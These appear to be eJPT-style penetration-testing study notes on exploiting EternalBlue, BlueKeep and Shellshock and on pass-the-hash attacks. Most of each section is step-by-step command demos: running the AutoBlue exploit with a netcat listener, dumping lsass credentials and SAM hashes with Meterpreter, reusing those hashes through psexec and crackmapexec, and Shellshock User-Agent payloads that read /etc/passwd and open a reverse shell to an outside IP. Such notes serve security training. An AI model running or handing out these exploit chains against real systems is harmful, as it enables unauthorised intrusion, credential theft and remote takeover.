# 10 Vulnerability Analysis 

## EternalBlue
MS17-010/CVE-2017-0144
Collection of Windows vulnerabilities and exploits

Takes advantage of a vulnerability in the **Windows SMBv1** protocol that allows attackers to send specially crafted packets.

Provides privileged access on the target system.

**Versions:**
- Windows Vista
- Windows 7
- Windows Server 2008
- Windows 8.1
- Windows Server 2012
- Windows 10
- Windows Server 2016

MSF auxiliary module and exploit module.

###### Tool: [https://github.com/3ndG4me/AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010)

#### Demo
Manual:
```bash
nmap -sV -p 445 -O <IP>
nmap -sV -p 445 —script=smb-vuln-ms17-010 <ip>
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
pip install -r requirements.txt
cd <path>/AutoBlue-MS17-010/shellcode
chmod +x shell_prep.sh
./shell_prep.sh
	y
	<my-ip>
	<my-port>
	<my-port>
	1
	1
nc -nvlp <my-port> (on new shell)
chmod +x eternalblue_exploit7.py
python eternalblue_exploit7.py <ip-target> shellcode/sc_x64.bin
```
Automatic:
```bash
search eternalblue (auxiliary and exploit)
```

## BlueKeep
CVE-2019-0708 RDP
Vulnerability in the **RPD** protocol, provides privileged access on the target system.

Gain access to a chunk of kernel memory consequently allowing to remotely execute arbitrary code at system level without authentication.

**Versions:**
- Windows XP
- Windows Vista
- Windows 7
- Windows Server 2008 & R2

MSF auxiliary module and exploit module.

#### Demo
```bash
nmap -p 3389 <ip>
msf6: search BlueKeep
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > show targets
```

## Pass-the-Hash Attacks
Capturing or harvesting NTLM hashes or clear-text password.
Authenticate via SMB.

###### **Tools:**

- Metasploit PsExec module
- Crackmapexec

#### Demo
```bash
msf6: search badblue
meterpreter > pgrep lsass
meterpreter > migrate 780
meterpreter > getuid
meterpreter > load kiwi
meterpreter > lsa_dump_sam
meterpreter > hashdump
ctrl + z
msf6 exploit(windows/smb/psexec)
msf6: show options
msf6: sessions
msf6: set LPORT <different-port>
msf6: set RHOSTS <target-ip>
msf6: set SMBPass <hash>
msf6: exploit
msf6: set target
msf6: set target Command
msf6: exploit
msf6: set target Native\ upload
msf6: exploit

crackmapexec smb <ip> -u <username> -H “NTLM hash”
-x “ipconfig”
```

## Frequently Exploited Linux Services
Linux kernel, GNU toolkit: GNU/Linux

| Protocol/Service             | Ports            | Purpose                                                                                                                                                                         |
| ---------------------------- | ---------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Apache Web Server            | TCP ports 80/443 | Free and open source cross-platform web server released under the Apache License 2.0. Apache accounts for over 80% of web servers globally.                                     |
| SSH (Secure Shell)           | TCP port 22      | SSH is a cryptographic remote access protocol that is used to remotely access and control systems over an unsecured network. SSH was developed as a secure successor to telnet. |
| FTP (File Transfer Protocol) | TCP port 21      | FTP is used to facilitate file sharing between a server and client/clients and vice versa.                                                                                      |
| SAMBA                        | TCP port 445     | Samba is the Linux implementation of SMB, and allow Windows systems to access Linux shares and devices.                                                                         |

## Shellshock
CVE-2014-6271
Vulnerability in the **Bash shell** (since V1.3) is caused whereby Bash mistakenly executes trailing commands after a series of characters `() { :; };)` .

Apache web servers configured to run CGI scripts or .sh scripts are also vulnerable. CGI (Common Gateway Interface) scripts are used by Apache to execute arbitrary commands on the Linux system after which the output is displayed to the client.

Exploitation
- Locate an input vector or script that allows you to communicate with Bash
- In Apache web server, we can utilize any legitimate CGI scripts accessible on the web server
- Whenever a CGI scrip is executed, the web server will initiate a new process and run the CGI script with Bash.
- This vulnerability can be exploited both manually and automatically with the use of an MSF exploit module.

#### Demo
```bash
nmap -sV <ip> —script=http-shellshock —script-args “http-shellshock.uri=/gettime.cgi”
burp suite: proxy: intercept on
burp suite: repeater: User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
burp suite: repeater: send

Gain reverse shell:
nc -nvlp 1234

User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/192.209.127.2/1234 0>&1'

msf6: search shellshock
msf6: exploit(multi/http/apache_mod_cgi_bash_env_exec)
```

#eJPT #cybersecurity   